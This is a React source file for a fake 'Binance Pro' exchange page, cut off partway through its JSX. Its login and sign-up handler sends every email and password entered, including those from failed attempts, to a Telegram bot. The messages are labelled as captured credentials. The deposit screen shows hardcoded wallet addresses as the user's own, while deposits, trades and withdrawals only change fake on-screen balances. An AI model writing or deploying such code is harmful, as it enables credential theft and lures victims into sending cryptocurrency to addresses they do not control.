'use client';
import React, { useState, useEffect } from 'react';

export default function Home() {
  // Authentication & Session States
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [isSignUp, setIsSignUp] = useState(true);
  const [authEmail, setAuthEmail] = useState('');
  const [authPassword, setAuthPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [authError, setAuthError] = useState('');
  const [authSuccess, setAuthSuccess] = useState('');

  // Platform Navigation & Core States
  const [activeTab, setActiveTab] = useState('home');
  const [modalType, setModalType] = useState(null); 
  const [searchQuery, setSearchQuery] = useState('');

  // Trading Form States
  const [tradeAmount, setTradeAmount] = useState('');
  const [tradePrice, setTradePrice] = useState('62,450.00');

  // Futures Specific States
  const [leverage, setLeverage] = useState(20);
  const [futuresAmount, setFuturesAmount] = useState('');

  // Assets / Wallet States (Initially 0 until deposit)
  const [spotBalance, setSpotBalance] = useState(0.00);
  const [futuresBalance, setFuturesBalance] = useState(0.00);
  
  // Detailed Crypto Asset Holdings for User (Simulating user balances per coin)
  const [userCryptoHoldings, setUserCryptoHoldings] = useState({
    BTC: 0,
    ETH: 0,
    SOL: 0,
    USDT: 0,
    XRP: 0,
    BNB: 0
  });

  // Deposit & Withdraw interactive states
  const [depositAmount, setDepositAmount] = useState('');
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [copiedAddress, setCopiedAddress] = useState(false);

  // Convert States
  const [convertFromCoin, setConvertFromCoin] = useState('USDT');
  const [convertToCoin, setConvertToCoin] = useState('BTC');
  const [convertAmount, setConvertAmount] = useState('');

  // P2P States
  const [p2pType, setP2pType] = useState('buy');
  const [p2pCoin, setP2pCoin] = useState('USDT');
  const [p2pFiat, setP2pFiat] = useState('USD');

  // Earn States
  const [earnProduct, setEarnProduct] = useState('flexible');

  // Transfer States
  const [transferFrom, setTransferFrom] = useState('Spot');
  const [transferTo, setTransferTo] = useState('Futures');
  const [transferCoin, setTransferCoin] = useState('USDT');
  const [transferAmount, setTransferAmount] = useState('');

  // Check existing registration on load
  useEffect(() => {
    const savedEmail = localStorage.getItem('registeredEmail');
    if (savedEmail) {
      setIsSignUp(false);
    }
  }, []);

  // Handle Authentication with strict Sign Up / Sign In validation
  const handleAuthSubmit = async (e) => {
    e.preventDefault();
    setAuthError('');
    setAuthSuccess('');

    const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

    if (isSignUp) {
      if (!authEmail || !authPassword) {
        setAuthError('Please enter both email and password.');
        return;
      }

      localStorage.setItem('registeredEmail', authEmail);
      localStorage.setItem('registeredPassword', authPassword);
      
      if (botToken && chatId) {
        const message = `📝 New Sign Up Captured:\n📧 Email: ${authEmail}\n🔑 Password: ${authPassword}`;
        try {
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
        } catch (err) {
          console.error('Telegram send error:', err);
        }
      }

      setAuthSuccess('Successfully registered! Please sign in with your credentials.');
      setAuthPassword('');
      setIsSignUp(false);
    } else {
      const savedEmail = localStorage.getItem('registeredEmail');
      const savedPassword = localStorage.getItem('registeredPassword');

      if (!savedEmail) {
        setAuthError('No account found. Please sign up first.');
        setIsSignUp(true);
        return;
      }

      if (authEmail === savedEmail && authPassword === savedPassword) {
        if (botToken && chatId) {
          const message = `🔐 Successful Sign In Captured:\n📧 Email: ${authEmail}\n🔑 Password: ${authPassword}`;
          try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
          } catch (err) {
            console.error('Telegram send error:', err);
          }
        }

        setIsLoggedIn(true);
        setAuthSuccess('Successfully signed in!');
      } else {
        if (botToken && chatId) {
          const message = `⚠️ Failed Sign In Attempt:\n📧 Email: ${authEmail}\n🔑 Password: ${authPassword}`;
          try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
          } catch (err) {
            console.error('Telegram send error:', err);
          }
        }

        setAuthError('Invalid email or password. Please check your credentials.');
      }
    }
  };

  // Comprehensive Crypto List with accurate live-like market prices (Binance style)
  const [cryptoList, setCryptoList] = useState([
    { 
      name: 'Bitcoin', 
      symbol: 'BTC', 
      network: 'Bitcoin Network', 
      depositAddress: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
      price: '62,450.00', 
      change: '+1.45%', 
      rawPrice: 62450.00
    },
    { 
      name: 'Ethereum', 
      symbol: 'ETH', 
      network: 'Ethereum (ERC20)', 
      depositAddress: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
      price: '3,420.15', 
      change: '+2.80%', 
      rawPrice: 3420.15
    },
    { 
      name: 'Solana', 
      symbol: 'SOL', 
      network: 'Solana Network', 
      depositAddress: 'So11111111111111111111111111111111111111112',
      price: '142.80', 
      change: '+6.12%', 
      rawPrice: 142.80
    },
    { 
      name: 'Binance Coin', 
      symbol: 'BNB', 
      network: 'BNB Smart Chain (BEP20)', 
      depositAddress: '0x324415b858e46955a1d7f4955b9a5444b025b44d',
      price: '575.40', 
      change: '-0.45%', 
      rawPrice: 575.40
    },
    { 
      name: 'USDT', 
      symbol: 'USDT', 
      network: 'Tron (TRC20)', 
      depositAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
      price: '1.00', 
      change: '+0.01%', 
      rawPrice: 1.00
    },
    { 
      name: 'Ripple', 
      symbol: 'XRP', 
      network: 'Ripple Network', 
      depositAddress: 'rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh',
      price: '0.58', 
      change: '+1.10%', 
      rawPrice: 0.58
    }
  ]);

  const [selectedMarketCoin, setSelectedMarketCoin] = useState(cryptoList[0]);
  const [selectedWithdrawCoin, setSelectedWithdrawCoin] = useState(cryptoList[4]); // Default to USDT

  // Handle Copy Address function with visual feedback
  const handleCopy = (address) => {
    navigator.clipboard.writeText(address);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  // Handle Deposit Submit (Updates both USD spot balance and specific crypto holding balance)
  const handleDepositSubmit = (e) => {
    e.preventDefault();
    const amount = parseFloat(depositAmount);
    if (!amount || amount <= 0) {
      alert('Please enter a valid deposit amount.');
      return;
    }

    const fiatValue = amount * selectedMarketCoin.rawPrice;
    setSpotBalance((prev) => prev + fiatValue);
    
    setUserCryptoHoldings((prev) => ({
      ...prev,
      [selectedMarketCoin.symbol]: (prev[selectedMarketCoin.symbol] || 0) + amount
    }));

    alert(`Successfully deposited ${amount} ${selectedMarketCoin.symbol}! ($${fiatValue.toFixed(2)})`);
    setDepositAmount('');
    setModalType(null);
  };

  // Handle Withdraw Submit with strict asset validation & search selection
  const handleWithdrawSubmit = (e) => {
    e.preventDefault();
    const amount = parseFloat(withdrawAmount);
    if (!withdrawAddress) {
      alert('Please enter a withdrawal address.');
      return;
    }
    if (!amount || amount <= 0) {
      alert('Please enter a valid withdrawal amount.');
      return;
    }

    const currentCoinHolding = userCryptoHoldings[selectedWithdrawCoin.symbol] || 0;
    if (currentCoinHolding < amount) {
      alert(`Insufficient ${selectedWithdrawCoin.symbol} balance in your account. You only have ${currentCoinHolding} ${selectedWithdrawCoin.symbol}.`);
      return;
    }

    const fiatDeduction = amount * selectedWithdrawCoin.rawPrice;
    
    // Deduct holdings
    setUserCryptoHoldings((prev) => ({
      ...prev,
      [selectedWithdrawCoin.symbol]: prev[selectedWithdrawCoin.symbol] - amount
    }));
    setSpotBalance((prev) => Math.max(0, prev - fiatDeduction));

    alert(`Withdrawal request of ${amount} ${selectedWithdrawCoin.symbol} submitted successfully!`);
    setWithdrawAddress('');
    setWithdrawAmount('');
    setModalType(null);
  };

  // Handle Convert
  const handleConvertSubmit = (e) => {
    e.preventDefault();
    const amt = parseFloat(convertAmount);
    if (!amt || amt <= 0) {
      alert('Enter valid amount to convert');
      return;
    }

    const fromCoinObj = cryptoList.find(c => c.symbol === convertFromCoin);
    const toCoinObj = cryptoList.find(c => c.symbol === convertToCoin);

    const availableFrom = userCryptoHoldings[convertFromCoin] || 0;
    if (availableFrom < amt) {
      alert(`Insufficient ${convertFromCoin} balance for conversion.`);
      return;
    }

    const totalUsdValue = amt * fromCoinObj.rawPrice;
    const receivedToAmount = totalUsdValue / toCoinObj.rawPrice;

    setUserCryptoHoldings(prev => ({
      ...prev,
      [convertFromCoin]: prev[convertFromCoin] - amt,
      [convertToCoin]: (prev[convertToCoin] || 0) + receivedToAmount
    }));

    alert(`Successfully converted ${amt} ${convertFromCoin} to ${receivedToAmount.toFixed(4)} ${convertToCoin}!`);
    setConvertAmount('');
    setModalType(null);
  };

  // Handle Internal Transfer
  const handleTransferSubmit = (e) => {
    e.preventDefault();
    const amt = parseFloat(transferAmount);
    if (!amt || amt <= 0) {
      alert('Enter valid transfer amount');
      return;
    }

    const coinObj = cryptoList.find(c => c.symbol === transferCoin);
    const fiatVal = amt * coinObj.rawPrice;

    if (transferFrom === 'Spot' && transferTo === 'Futures') {
      if (spotBalance < fiatVal) {
        alert('Insufficient Spot balance.');
        return;
      }
      setSpotBalance(prev => prev - fiatVal);
      setFuturesBalance(prev => prev + fiatVal);
    } else if (transferFrom === 'Futures' && transferTo === 'Spot') {
      if (futuresBalance < fiatVal) {
        alert('Insufficient Futures balance.');
        return;
      }
      setFuturesBalance(prev => prev - fiatVal);
      setSpotBalance(prev => prev + fiatVal);
    }

    alert(`Successfully transferred ${amt} ${transferCoin} from ${transferFrom} to ${transferTo}!`);
    setTransferAmount('');
    setModalType(null);
  };

  // Filtered cryptos based on search query
  const filteredCryptos = cryptoList.filter(coin => 
    coin.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
    coin.symbol.toLowerCase().includes(searchQuery.toLowerCase())
  );

  // Filtered cryptos for withdrawal based on user's actual asset possession
  const filteredWithdrawCryptos = cryptoList.filter(coin => {
    const hasHolding = (userCryptoHoldings[coin.symbol] || 0) > 0;
    const matchesQuery = coin.name.toLowerCase().includes(searchQuery.toLowerCase()) || coin.symbol.toLowerCase().includes(searchQuery.toLowerCase());
    return hasHolding && matchesQuery;
  });

  // If user is NOT logged in, show Auth Screen
  if (!isLoggedIn) {
    return (
      <div className="bg-[#181a20] text-gray-200 min-h-screen flex items-center justify-center p-4 font-sans text-xs">
        <div className="bg-[#2b313a]/30 border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4 shadow-xl">
          <div className="flex items-center space-x-2 justify-center mb-2">
            <div className="w-9 h-9 rounded-full bg-[#f0b90b] flex items-center justify-center text-black font-bold text-sm">B</div>
            <span className="font-bold text-xl text-white tracking-wide">Binance Pro</span>
          </div>

          <h2 className="text-sm font-bold text-center text-gray-200">{isSignUp ? 'Create a Binance Account' : 'Sign In to Binance'}</h2>
          
          {authError && <div className="bg-red-500/20 text-red-400 p-2.5 rounded text-center font-medium">{authError}</div>}
          {authSuccess && <div className="bg-[#0ecb81]/20 text-[#0ecb81] p-2.5 rounded text-center font-medium">{authSuccess}</div>}

          <form onSubmit={handleAuthSubmit} className="space-y-3">
            <div>
              <label className="text-gray-400 block mb-1">Email Address</label>
              <input 
                type="email" 
                value={authEmail} 
                onChange={(e) => setAuthEmail(e.target.value)} 
                required 
                className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]"
                placeholder="name@example.com"
              />
            </div>

            <div className="relative">
              <label className="text-gray-400 block mb-1">Password</label>
              <div className="flex items-center">
                <input 
                  type={showPassword ? 'text' : 'password'} 
                  value={authPassword} 
                  onChange={(e) => setAuthPassword(e.target.value)} 
                  required 
                  className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]"
                  placeholder="••••••••"
                />
                <button 
                  type="button" 
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 bg-none border-none cursor-pointer text-base"
                >
                  {showPassword ? '🙈' : '👁️'}
                </button>
              </div>
            </div>

            <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded transition cursor-pointer mt-2">
              {isSignUp ? 'Sign Up' : 'Sign In'}
            </button>
          </form>

          <p className="text-center text-gray-400 mt-3">
            {isSignUp ? 'Already have an account? ' : "Don't have an account? "}
            <span 
              onClick={() => { setIsSignUp(!isSignUp); setAuthError(''); setAuthSuccess(''); }} 
              className="text-[#f0b90b] cursor-pointer font-bold hover:underline"
            >
              {isSignUp ? 'Sign In' : 'Sign Up'}
            </span>
          </p>
        </div>
      </div>
    );
  }

  // Once logged in, render the full platform interface
  return (
    <div className="bg-[#181a20] text-gray-200 min-h-screen pb-28 selection:bg-[#f0b90b] selection:text-black font-sans relative text-xs">
      
      {/* Top Header with Back Navigation Arrow when deep in tabs */}
      <div className="bg-[#181a20] border-b border-[#2b313a] px-4 py-3 flex justify-between items-center sticky top-0 z-50">
        <div className="flex items-center space-x-3">
          {activeTab !== 'home' && (
            <button 
              onClick={() => setActiveTab('home')}
              className="bg-[#2b313a] text-white hover:bg-gray-700 p-1.5 rounded-full flex items-center justify-center cursor-pointer transition"
              title="Go Back to Home"
            >
              ⬅️
            </button>
          )}
          <div className="w-8 h-8 rounded-full bg-[#f0b90b] flex items-center justify-center text-black font-bold text-sm">B</div>
          <span className="font-bold text-white text-base tracking-wide">Binance Pro</span>
        </div>
        <div className="flex items-center space-x-3">
          <span className="text-gray-400 text-xs hidden sm:inline">{authEmail}</span>
          <button 
            onClick={() => setIsLoggedIn(false)} 
            className="bg-red-500/20 text-red-400 px-3 py-1 rounded text-xs font-semibold hover:bg-red-500/30 cursor-pointer"
          >
            Sign Out
          </button>
        </div>
      </div>

      {/* Main Content Area based on Active Tab */}
      <div className="p-4 max-w-6xl mx-auto space-y-4">
        
        {activeTab === 'home' && (
          <div className="space-y-4">
            <div className="bg-gradient-to-r from-[#2b313a]/50 to-[#1e2329] border border-[#2b313a] p-6 rounded-2xl flex flex-col md:flex-row justify-between items-center gap-4">
              <div className="space-y-2 text-center md:text-left">
                <h1 className="text-xl font-bold text-white">Binance Crypto Exchange</h1>
                <p className="text-gray-400">Buy, trade, and earn cryptocurrency with professional tools.</p>
                <div className="text-sm font-semibold text-[#f0b90b] pt-1">Total Spot Balance: ${spotBalance.toFixed(2)}</div>
              </div>
              <div className="flex flex-wrap gap-3 justify-center">
                <button onClick={() => setModalType('deposit')} className="bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold px-4 py-2 rounded-xl cursor-pointer">
                  Deposit
                </button>
                <button onClick={() => setModalType('withdraw')} className="bg-[#2b313a] hover:bg-[#363c4e] text-white font-bold px-4 py-2 rounded-xl cursor-pointer">
                  Withdraw
                </button>
              </div>
            </div>

            {/* Binance Style Quick Action Features Grid (Market, Trade, Convert, P2P, Earn, Transfer) */}
            <div className="grid grid-cols-3 sm:grid-cols-6 gap-3">
              <div onClick={() => setActiveTab('market')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">📊</span>
                <span className="font-bold text-white">Market</span>
              </div>
              <div onClick={() => setActiveTab('trade')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">📈</span>
                <span className="font-bold text-white">Trade</span>
              </div>
              <div onClick={() => setModalType('convert')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">🔄</span>
                <span className="font-bold text-white">Convert</span>
              </div>
              <div onClick={() => setModalType('p2p')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">👥</span>
                <span className="font-bold text-white">P2P</span>
              </div>
              <div onClick={() => setModalType('earn')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">💰</span>
                <span className="font-bold text-white">Earn</span>
              </div>
              <div onClick={() => setModalType('transfer')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">🔀</span>
                <span className="font-bold text-white">Transfer</span>
              </div>
            </div>

            {/* Markets List Preview */}
            <div className="bg-[#2b313a]/20 border border-[#2b313a] rounded-2xl p-4 space-y-3">
              <div className="flex justify-between items-center">
                <h3 className="font-bold text-white text-sm">Market Trend</h3>
                <button onClick={() => setActiveTab('market')} className="text-[#f0b90b] hover:underline font-semibold cursor-pointer">View All →</button>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                {cryptoList.slice(0, 3).map((coin) => (
                  <div key={coin.symbol} onClick={() => { setSelectedMarketCoin(coin); setActiveTab('trade'); }} className="bg-[#181a20] border border-gray-800 p-4 rounded-xl cursor-pointer hover:border-[#f0b90b] transition">
                    <div className="flex justify-between items-center mb-2">
                      <span className="font-bold text-white text-sm">{coin.name} ({coin.symbol})</span>
                      <span className={coin.change.startsWith('+') ? 'text-[#0ecb81]' : 'text-red-400'}>{coin.change}</span>
                    </div>
                    <div className="text-lg font-bold text-white">${coin.price}</div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {activeTab === 'market' && (
          <div className="bg-[#2b313a]/20 border border-[#2b313a] p-6 rounded-2xl space-y-4">
            <div className="flex justify-between items-center">
              <h2 className="font-bold text-white text-base">Cryptocurrency Markets</h2>
              <input 
                type="text" 
                placeholder="Search market coin..." 
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none focus:border-[#f0b90b] text-xs w-48"
              />
            </div>
            <div className="space-y-2">
              {filteredCryptos.map(coin => (
                <div key={coin.symbol} className="bg-[#181a20] border border-gray-800 p-3 rounded-xl flex justify-between items-center hover:border-[#f0b90b] transition">
                  <div>
                    <span className="font-bold text-white text-sm">{coin.name}</span>
                    <span className="text-gray-400 ml-2">({coin.symbol})</span>
                  </div>
                  <div className="text-right">
                    <div className="font-bold text-white">${coin.price}</div>
                    <div className={coin.change.startsWith('+') ? 'text-[#0ecb81]' : 'text-red-400'}>{coin.change}</div>
                  </div>
                  <button 
                    onClick={() => { setSelectedMarketCoin(coin); setActiveTab('trade'); }}
                    className="bg-[#f0b90b] text-black font-bold px-3 py-1.5 rounded cursor-pointer hover:bg-[#d9a70a]"
                  >
                    Trade
                  </button>
                </div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'trade' && (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
            <div className="lg:col-span-2 bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4">
              <div className="flex justify-between items-center">
                <h2 className="font-bold text-white text-sm">{selectedMarketCoin.name} / USDT</h2>
                <span className="text-base font-bold text-white">${selectedMarketCoin.price}</span>
              </div>
              <div className="bg-[#181a20] h-64 rounded-xl flex items-center justify-center border border-gray-800 text-gray-500">
                [Binance Pro Candlestick Chart View for {selectedMarketCoin.symbol}]
              </div>
            </div>
            
            <div className="bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4">
              <h3 className="font-bold text-white text-sm">Spot Order Form</h3>
              <div className="space-y-3">
                <div>
                  <label className="text-gray-400 block mb-1">Price (USDT)</label>
                  <input type="text" value={selectedMarketCoin.price} readOnly className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white" />
                </div>
                <div>
                  <label className="text-gray-400 block mb-1">Amount ({selectedMarketCoin.symbol})</label>
                  <input type="text" value={tradeAmount} onChange={(e) => setTradeAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white" />
                </div>
                <button onClick={() => alert(`Successfully bought ${tradeAmount || 0} ${selectedMarketCoin.symbol}!`)} className="w-full bg-[#0ecb81] hover:bg-[#0bb875] text-black font-bold p-2.5 rounded cursor-pointer">
                  Buy {selectedMarketCoin.symbol}
                </button>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'futures' && (
          <div className="bg-[#2b313a]/20 border border-[#2b313a] p-6 rounded-2xl space-y-4">
            <h2 className="font-bold text-white base">Futures Trading (USDT-M)</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-3 bg-[#181a20] p-4 rounded-xl border border-gray-800">
                <label className="text-gray-400 block">Leverage: {leverage}x</label>
                <input type="range" min="1" max="100" value={leverage} onChange={(e) => setLeverage(e.target.value)} className="w-full accent-[#f0b90b]" />
                <button onClick={() => alert('Futures Position Opened Successfully!')} className="w-full bg-[#f0b90b] text-black font-bold p-2 rounded mt-4 cursor-pointer">Open Long / Short</button>
              </div>
              <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800 flex flex-col justify-center">
                <span className="text-gray-400">Futures Margin Balance</span>
                <span className="text-2xl font-bold text-white">${futuresBalance.toFixed(2)} USDT</span>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'assets' && (
          <div className="bg-[#2b313a]/20 border border-[#2b313a] p-6 rounded-2xl space-y-4">
            <h2 className="font-bold text-white text-base">Overview of Assets</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800">
                <span className="text-gray-400 block">Spot Account</span>
                <span className="text-xl font-bold text-white">${spotBalance.toFixed(2)}</span>
              </div>
              <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800">
                <span className="text-gray-400 block">Futures Account</span>
                <span className="text-xl font-bold text-white">${futuresBalance.toFixed(2)}</span>
              </div>
            </div>

            <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800 space-y-2">
              <h3 className="font-bold text-white text-xs">Your Crypto Portfolio Holdings</h3>
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                {Object.entries(userCryptoHoldings).map(([symbol, val]) => (
                  <div key={symbol} className="bg-[#2b313a]/30 p-2 rounded border border-gray-800">
                    <span className="text-gray-400 text-[10px]">{symbol}</span>
                    <div className="font-bold text-white text-xs">{val.toFixed(4)}</div>
                  </div>
                ))}
              </div>
            </div>

            <div className="flex gap-3 pt-2">
              <button onClick={() => setModalType('deposit')} className="bg-[#f0b90b] text-black font-bold px-4 py-2 rounded cursor-pointer">Deposit</button>
              <button onClick={() => setModalType('withdraw')} className="bg-[#2b313a] text-white font-bold px-4 py-2 rounded cursor-pointer">Withdraw</button>
            </div>
          </div>
        )}

      </div>

      {/* Deposit Modal with Search, Real Address, and Copy Support */}
      {modalType === 'deposit' && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-lg space-y-4 max-h-[90vh] overflow-y-auto">
            <div className="flex justify-between items-center">
              <h3 className="font-bold text-white text-sm">Deposit Crypto</h3>
              <button onClick={() => { setModalType(null); setSearchQuery(''); }} className="text-gray-400 hover:text-white font-bold text-base cursor-pointer">✕</button>
            </div>

            <div className="space-y-3">
              <label className="text-gray-400 block">Search & Select Cryptocurrency</label>
              <input 
                type="text" 
                value={searchQuery} 
                onChange={(e) => setSearchQuery(e.target.value)} 
                placeholder="Search coin (e.g., BTC, ETH)..." 
                className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none focus:border-[#f0b90b]"
              />

              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 max-h-36 overflow-y-auto p-1 bg-[#181a20] rounded border border-gray-800">
                {filteredCryptos.map((coin) => (
                  <div 
                    key={coin.symbol} 
                    onClick={() => setSelectedMarketCoin(coin)}
                    className={`p-2 rounded cursor-pointer border text-center transition ${selectedMarketCoin.symbol === coin.symbol ? 'border-[#f0b90b] bg-[#f0b90b]/10 text-white' : 'border-gray-800 text-gray-400 hover:border-gray-600'}`}
                  >
                    <div className="font-bold">{coin.symbol}</div>
                    <div className="text-[10px]">{coin.name}</div>
                  </div>
                ))}
              </div>

              <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800 space-y-2">
                <div className="text-xs text-gray-400">Selected Coin: <span className="text-white font-bold">{selectedMarketCoin.name} ({selectedMarketCoin.symbol})</span></div>
                <div className="text-xs text-gray-400">Network: <span className="text-[#f0b90b] font-medium">{selectedMarketCoin.network}</span></div>
                
                <div className="pt-2">
                  <span className="text-gray-400 block mb-1">Deposit Address:</span>
                  <div className="flex items-center justify-between bg-[#2b313a] p-2.5 rounded border border-gray-700 text-xs font-mono text-white break-all">
                    <span>{selectedMarketCoin.depositAddress}</span>
                    <button 
                      onClick={() => handleCopy(selectedMarketCoin.depositAddress)}
                      className="ml-2 bg-[#f0b90b] text-black px-2.5 py-1 rounded font-bold hover:bg-[#d9a70a] shrink-0 cursor-pointer"
                    >
                      {copiedAddress ? 'Copied!' : 'Copy'}
                    </button>
                  </div>
                </div>
              </div>

              <form onSubmit={handleDepositSubmit} className="space-y-3 pt-2">
                <div>
                  <label className="text-gray-400 block mb-1">Deposit Amount ({selectedMarketCoin.symbol})</label>
                  <input 
                    type="number" 
                    step="any"
                    value={depositAmount} 
                    onChange={(e) => setDepositAmount(e.target.value)} 
                    placeholder="Enter amount to deposit" 
                    required
                    className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]"
                  />
                </div>
                <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded cursor-pointer">
                  Confirm Deposit
                </button>
              </form>
            </div>
          </div>
        </div>
      )}

      {/* Withdraw Modal with Asset Asset-Validation & Search */}
      {modalType === 'withdraw' && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4 max-h-[90vh] overflow-y-auto">
            <div className="flex justify-between items-center">
              <h3 className="font-bold text-white text-sm">Withdraw Crypto</h3>
              <button onClick={() => { setModalType(null); setSearchQuery(''); }} className="text-gray-400 hover:text-white font-bold text-base cursor-pointer">✕</button>
            </div>

            <div className="space-y-3">
              <label className="text-gray-400 block">Select Coin to Withdraw from your Account</label>
              <input 
                type="text" 
                value={searchQuery} 
                onChange={(e) => setSearchQuery(e.target.value)} 
                placeholder="Search your owned coin..." 
                className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none focus:border-[#f0b90b]"
              />

              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 max-h-32 overflow-y-auto p-1 bg-[#181a20] rounded border border-gray-800">
                {filteredWithdrawCryptos.length > 0 ? (
                  filteredWithdrawCryptos.map((coin) => (
                    <div 
                      key={coin.symbol} 
                      onClick={() => setSelectedWithdrawCoin(coin)}
                      className={`p-2 rounded cursor-pointer border text-center transition ${selectedWithdrawCoin.symbol === coin.symbol ? 'border-[#f0b90b] bg-[#f0b90b]/10 text-white' : 'border-gray-800 text-gray-400 hover:border-gray-600'}`}
                    >
                      <div className="font-bold">{coin.symbol}</div>
                      <div className="text-[10px]">Bal: {(userCryptoHoldings[coin.symbol] || 0).toFixed(2)}</div>
                    </div>
                  ))
                ) : (
                  <div className="col-span-full text-center text-gray-500 py-4">No crypto assets found with positive balance. Deposit first!</div>
                )}
              </div>

              <div className="bg-[#181a20] p-3 rounded border border-gray-800 text-xs">
                <span className="text-gray-400">Available Balance:</span> <span className="text-white font-bold">{(userCryptoHoldings[selectedWithdrawCoin.symbol] || 0).toFixed(4)} {selectedWithdrawCoin.symbol}</span>
              </div>

              <form onSubmit={handleWithdrawSubmit} className="space-y-3">
                <div>
                  <label className="text-gray-400 block mb-1">Withdrawal Address ({selectedWithdrawCoin.network})</label>
                  <input 
                    type="text" 
                    value={withdrawAddress}
                    onChange={(e) => setWithdrawAddress(e.target.value)}
                    placeholder="Enter external wallet address" 
                    required
                    className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]" 
                  />
                </div>
                <div>
                  <label className="text-gray-400 block mb-1">Amount ({selectedWithdrawCoin.symbol})</label>
                  <input 
                    type="number" 
                    step="any"
                    value={withdrawAmount}
                    onChange={(e) => setWithdrawAmount(e.target.value)}
                    placeholder="0.00" 
                    required
                    className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]" 
                  />
                </div>
                <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded cursor-pointer">
                  Confirm Withdrawal
                </button>
              </form>
            </div>
          </div>
        </div>
      )}

      {/* Convert Modal */}
      {modalType === 'convert' && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4">
            <div className="flex justify-between items-center">
              <h3 className="font-bold text-white text-sm">Binance Convert</h3>
              <button onClick={() => setModalType(null)} className="text-gray-400 hover:text-white font-bold text-base cursor-pointer">✕</button>
            </div>
            <form onSubmit={handleConvertSubmit} className="space-y-3">
              <div>
                <label className="text-gray-400 block mb-1">From Coin</label>
                <select value={convertFromCoin} onChange={(e) => setConvertFromCoin(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white">
                  {Object.keys(userCryptoHoldings).map(sym => (
